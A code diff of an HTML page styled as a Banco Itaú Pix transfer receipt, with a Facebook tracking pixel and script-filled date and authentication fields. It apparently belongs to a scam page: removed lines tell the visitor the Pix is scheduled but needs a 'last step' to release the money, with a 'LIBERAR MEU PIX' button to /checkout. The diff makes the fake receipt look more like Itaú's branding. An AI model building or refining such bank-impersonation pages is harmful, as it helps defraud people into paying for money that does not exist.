@@ -20,12 +20,13 @@ src="https://www.facebook.com/tr?id=918538257349766&ev=PageView&noscript=1"/></n
             background: #f5f5f5;
             display: flex;
             flex-direction: column;
-            justify-content: center;
+            justify-content: flex-start;
             align-items: center;
-            min-height: 100vh;
+            min-height: unset;
             margin: 0;
-            padding: 20px;
-            gap: 16px;
+            padding: 12px;
+            gap: 10px;
+            overflow: hidden;
         }
         .topo-aviso {
             max-width: 420px;
@@ -63,9 +64,21 @@ src="https://www.facebook.com/tr?id=918538257349766&ev=PageView&noscript=1"/></n
             width: 100%;
             background: #FFFFFF;
             border-radius: 16px;
-            padding: 32px 28px;
+            padding: 0;
             box-shadow: 0 2px 12px rgba(0,0,0,0.08);
             border: 1px solid #e8ecf0;
+            overflow: hidden;
+        }
+        .card-faixa {
+            background: #EC7000;
+            width: 100%;
+            padding: 18px 28px;
+        }
+        .card-faixa .banco-texto {
+            color: #fff;
+        }
+        .card-body {
+            padding: 20px 28px 32px;
         }
 
         /* ===== CABEÇALHO: LOGO + "banco itaú" ===== */
@@ -102,24 +115,52 @@ src="https://www.facebook.com/tr?id=918538257349766&ev=PageView&noscript=1"/></n
 
         /* ===== DESTAQUE VERDE ===== */
         .destaque-verde {
-            background: #e8f5e9;
-            border-left: 4px solid #2e7d32;
-            border-radius: 8px;
-            padding: 14px 18px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
+            display: inline-flex;
             align-items: center;
+            gap: 12px;
+            padding: 10px 18px;
+            border-radius: 999px;
+            background: #00bf32;
+            color: #fff;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        .destaque-verde .dv-icon {
+            width: 38px;
+            height: 38px;
+            flex-shrink: 0;
+            border-radius: 50%;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .destaque-verde .dv-icon svg {
+            width: 26px;
+            height: 26px;
+        }
+        .destaque-verde .dv-divider {
+            width: 1.5px;
+            height: 32px;
+            background: rgba(255,255,255,.45);
+            flex-shrink: 0;
+        }
+        .destaque-verde .dv-texts {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            min-width: 0;
         }
         .destaque-verde .label {
-            color: #2e7d32;
+            font-size: 13px;
             font-weight: 600;
-            font-size: 14px;
+            color: rgba(255,255,255,0.9);
         }
         .destaque-verde .valor {
-            color: #1a1a2e;
-            font-weight: 600;
-            font-size: 14px;
+            font-size: clamp(12px, 3.5vw, 16px);
+            font-weight: 700;
+            white-space: nowrap;
+            color: #fff;
         }
 
         /* ===== TODAS AS LINHAS NA ESQUERDA ===== */
@@ -210,19 +251,15 @@ src="https://www.facebook.com/tr?id=918538257349766&ev=PageView&noscript=1"/></n
     </style>
 </head>
 <body>
-    <div class="topo-aviso">
-        <span class="emoji">✅</span>
-        <div class="titulo">Seu Pix já foi agendado!</div>
-        <div class="sub">Apenas falta cumprir a última etapa para a liberação do valor na sua conta.</div>
-    </div>
-
     <div class="card">
-
-        <!-- ===== CABEÇALHO: LOGO + "banco itaú" (azul escuro) ===== -->
-        <div class="header">
-            <img src="itau-logo.png" alt="Itaú" class="logo-itau-img">
-            <span class="banco-texto">banco itaú</span>
+        <div class="card-faixa">
+            <!-- ===== CABEÇALHO: LOGO + "banco itaú" ===== -->
+            <div class="header">
+                <img src="itau-logo.png" alt="Itaú" class="logo-itau-img">
+                <span class="banco-texto">banco itaú</span>
+            </div>
         </div>
+        <div class="card-body">
 
         <div class="subtitulo">
             transferência PIX via app Itaú
@@ -230,9 +267,19 @@ src="https://www.facebook.com/tr?id=918538257349766&ev=PageView&noscript=1"/></n
 
         <!-- ===== DESTAQUE VERDE: AGENDADA EM ===== -->
         <div class="destaque-verde">
-            <span class="label">✔ agendada em</span>
-            <span class="valor" id="data-hora">Carregando...</span>
+            <div class="dv-icon">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#00bf32" d="M12 1.5 14.5 3l2.9-.2 1.4 2.5 2.6 1.3-.2 2.9 1.3 2.5-1.3 2.5 .2 2.9-2.6 1.3-1.4 2.5-2.9-.2 -2.5 1.5-2.5-1.5-2.9.2-1.4-2.5 -2.6-1.3.2-2.9L1.5 12l1.3-2.5 -.2-2.9 2.6-1.3 1.4-2.5 2.9.2Z"/>
+                    <path d="m7.2 12.1 3.1 3.1 6.5-6.5" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            <div class="dv-divider"></div>
+            <div class="dv-texts">
+                <span class="label">Agendada em</span>
+                <span class="valor" id="data-hora">Carregando...</span>
+            </div>
         </div>
+
 
         <!-- ===== VALOR ===== -->
         <div class="linha">
@@ -282,13 +329,9 @@ src="https://www.facebook.com/tr?id=918538257349766&ev=PageView&noscript=1"/></n
             <span class="valor" id="autenticacao">Carregando...</span>
         </div>
 
+        </div><!-- end card-body -->
     </div>
 
-    <a href="/checkout" id="btnContinuar" class="btn-continuar">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
-        LIBERAR MEU PIX
-        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
-    </a>
 
     <script>
         // ===== DATA E HORA ATUAL =====
